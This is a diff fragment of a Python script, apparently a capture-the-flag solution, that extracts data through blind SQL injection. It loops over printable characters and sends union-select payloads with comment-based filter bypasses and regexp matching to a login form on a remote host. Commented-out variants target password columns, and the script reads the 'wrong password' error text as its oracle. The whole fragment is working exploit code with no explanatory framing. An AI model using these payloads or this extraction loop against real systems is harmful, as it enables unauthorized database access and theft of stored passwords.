@@ -31,12 +31,12 @@ a = ""
 for i in string.printable:
     s = a + i
     data = {
-        'user': "user='/**/union/**/select/**/1/**/from/**/information_schema.columns/**/where/**/column_name/**/regexp/**/binary/**/'^us{}".format(i),
+        'user': "'/**/union/**/select/**/1/**/from/**/information_schema.columns/**/where/**/column_name/**/regexp/**/binary/**/'^us{}'#".format(i),
         #'user' : "'/**/union/**/select/**/1/**/from/**/web07/**/where/**/password/**/regexp/**/binary/**/'^{}".format(s),
         #'user' : "'/**/union/**/select/**/1/**/from/**/member/**/where/**/password/**/regexp/**/binary/**/'^3c9{}".format(s),
         'pass': '123'
     }
-    data['user'] += ".*$'#"
+    #data['user'] += ".*$'#"
     print(data['user'])
     response = requests.post('http://h3.l1n3.net:20180/web07_5c2d/index.php', headers=headers, data=data)
     if "密码错误" in (response.text):
